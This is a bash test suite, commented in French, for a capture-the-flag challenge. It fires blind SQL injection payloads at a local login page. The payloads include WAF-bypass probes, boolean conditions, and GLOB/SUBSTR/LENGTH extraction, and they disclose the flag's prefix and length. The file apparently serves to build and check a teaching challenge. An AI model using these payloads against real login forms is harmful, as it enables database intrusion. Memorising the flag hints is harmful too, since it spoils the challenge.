#!/bin/bash
#
# CH06 - Caine: Script de test complet
# Usage: ./test.sh [URL]
# Default: http://localhost:5000
#

URL="${1:-http://localhost:5000}"
PASS=0
FAIL=0

# Couleurs
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

echo -e "${CYAN}"
echo "╔════════════════════════════════════════════════════════════╗"
echo "║       CH06 - CAINE : BLIND SQLI TEST SUITE                 ║"
echo "╚════════════════════════════════════════════════════════════╝"
echo -e "${NC}"
echo -e "Target: ${YELLOW}$URL${NC}"
echo ""

# Fonction de test
test_case() {
    local name="$1"
    local payload="$2"
    local expected="$3"
    local description="$4"

    result=$(curl -s -X POST "$URL/" -d "username=$payload&password=x")

    if echo "$result" | grep -q "$expected"; then
        echo -e "${GREEN}[PASS]${NC} $name"
        echo -e "       ${CYAN}→${NC} $description"
        ((PASS++))
    else
        echo -e "${RED}[FAIL]${NC} $name"
        echo -e "       Expected: $expected"
        actual=$(echo "$result" | grep -o "Access denied\|Invalid credentials" | head -1)
        echo -e "       Got: $actual"
        ((FAIL++))
    fi
}

# ═══════════════════════════════════════════════════════════════
echo -e "\n${YELLOW}[1/6] HEALTH CHECK${NC}"
echo "────────────────────────────────────────────────────────────"

health=$(curl -s "$URL/health")
if [ "$health" = "ok" ]; then
    echo -e "${GREEN}[PASS]${NC} Health endpoint"
    ((PASS++))
else
    echo -e "${RED}[FAIL]${NC} Health endpoint - Server not responding"
    ((FAIL++))
    echo -e "\n${RED}Server not available. Exiting.${NC}"
    exit 1
fi

# ═══════════════════════════════════════════════════════════════
echo -e "\n${YELLOW}[2/6] LOGIN NORMAL${NC}"
echo "────────────────────────────────────────────────────────────"

test_case "Login admin (user existe, mauvais mdp)" \
    "admin" \
    "Access denied" \
    "User admin existe donc Access denied"

test_case "User inexistant" \
    "fakeuser" \
    "Invalid credentials" \
    "User qui n'existe pas"

# ═══════════════════════════════════════════════════════════════
echo -e "\n${YELLOW}[3/6] WAF - MOTS-CLES BLOQUES${NC}"
echo "────────────────────────────────────────────────────────────"

test_case "WAF bloque UNION" \
    "admin' UNION SELECT 1--" \
    "Invalid credentials" \
    "UNION doit etre bloque"

test_case "WAF bloque SELECT" \
    "admin' AND (SELECT 1)=1--" \
    "Invalid credentials" \
    "SELECT doit etre bloque"

test_case "WAF bloque SLEEP" \
    "admin' AND SLEEP(1)--" \
    "Invalid credentials" \
    "SLEEP doit etre bloque"

test_case "WAF bloque OR" \
    "admin' OR 1=1--" \
    "Invalid credentials" \
    "OR doit etre bloque"

test_case "WAF bloque BENCHMARK" \
    "admin' AND BENCHMARK(1,1)--" \
    "Invalid credentials" \
    "BENCHMARK doit etre bloque"

test_case "WAF bloque 0x (hex)" \
    "admin' AND 0x41=0x41--" \
    "Invalid credentials" \
    "Encodage hex doit etre bloque"

test_case "WAF bloque information_schema" \
    "admin' AND (SELECT 1 FROM information_schema.tables)--" \
    "Invalid credentials" \
    "information_schema doit etre bloque"

# ═══════════════════════════════════════════════════════════════
echo -e "\n${YELLOW}[4/6] BLIND SQLI - BOOLEAN BASED${NC}"
echo "────────────────────────────────────────────────────────────"

test_case "AND 1=1 (condition vraie)" \
    "admin' AND 1=1--" \
    "Access denied" \
    "Doit retourner Access denied (user trouve)"

test_case "AND 1=2 (condition fausse)" \
    "admin' AND 1=2--" \
    "Invalid credentials" \
    "Doit retourner Invalid credentials (user non trouve)"

test_case "AND 'a'='a' (string vraie)" \
    "admin' AND 'a'='a'--" \
    "Access denied" \
    "Condition string vraie"

test_case "AND 'a'='b' (string fausse)" \
    "admin' AND 'a'='b'--" \
    "Invalid credentials" \
    "Condition string fausse"

# ═══════════════════════════════════════════════════════════════
echo -e "\n${YELLOW}[5/6] EXTRACTION TECHNIQUES${NC}"
echo "────────────────────────────────────────────────────────────"

test_case "GLOB avec bon prefix" \
    "admin' AND secret GLOB 'NHK26*'--" \
    "Access denied" \
    "Secret commence par NHK26"

test_case "GLOB avec mauvais prefix" \
    "admin' AND secret GLOB 'WRONG*'--" \
    "Invalid credentials" \
    "Secret ne commence PAS par WRONG"

test_case "GLOB case-sensitive (N vs n)" \
    "admin' AND secret GLOB 'nhk26*'--" \
    "Invalid credentials" \
    "GLOB est case-sensitive, nhk26 != NHK26"

test_case "LENGTH du secret = 35" \
    "admin' AND LENGTH(secret)=35--" \
    "Access denied" \
    "Le flag fait 35 caracteres"

test_case "LENGTH du secret != 50" \
    "admin' AND LENGTH(secret)=50--" \
    "Invalid credentials" \
    "Le flag ne fait PAS 50 caracteres"

test_case "SUBSTR position 1 = N" \
    "admin' AND SUBSTR(secret,1,1)='N'--" \
    "Access denied" \
    "Premier caractere = N"

test_case "SUBSTR position 1 != X" \
    "admin' AND SUBSTR(secret,1,1)='X'--" \
    "Invalid credentials" \
    "Premier caractere != X"

test_case "LIKE avec prefix (case-insensitive)" \
    "admin' AND secret LIKE 'NHK26%'--" \
    "Access denied" \
    "LIKE fonctionne aussi"

# ═══════════════════════════════════════════════════════════════
echo -e "\n${YELLOW}[6/6] EDGE CASES${NC}"
echo "────────────────────────────────────────────────────────────"

test_case "Commentaire SQL --" \
    "admin'--" \
    "Access denied" \
    "Commentaire -- fonctionne"

test_case "Commentaire SQL # (non supporte par SQLite)" \
    "admin'#" \
    "Invalid credentials" \
    "SQLite ne supporte PAS # comme commentaire"

test_case "Username vide avec injection" \
    "' OR ''='" \
    "Invalid credentials" \
    "OR bloque meme sans espace avant"

test_case "Double quote" \
    "admin\" AND 1=1--" \
    "Invalid credentials" \
    "Double quotes ne fonctionnent pas (single quotes attendues)"

# ═══════════════════════════════════════════════════════════════
echo ""
echo -e "${CYAN}════════════════════════════════════════════════════════════${NC}"
echo -e "${CYAN}                      RESULTATS                             ${NC}"
echo -e "${CYAN}════════════════════════════════════════════════════════════${NC}"
echo ""
echo -e "  ${GREEN}PASS: $PASS${NC}"
echo -e "  ${RED}FAIL: $FAIL${NC}"
echo ""

TOTAL=$((PASS + FAIL))
PERCENT=$((PASS * 100 / TOTAL))

if [ $FAIL -eq 0 ]; then
    echo -e "  ${GREEN}★ ALL TESTS PASSED! ★${NC}"
else
    echo -e "  ${YELLOW}Score: $PERCENT% ($PASS/$TOTAL)${NC}"
fi

echo ""
echo -e "${CYAN}════════════════════════════════════════════════════════════${NC}"

# Exit code
[ $FAIL -eq 0 ] && exit 0 || exit 1
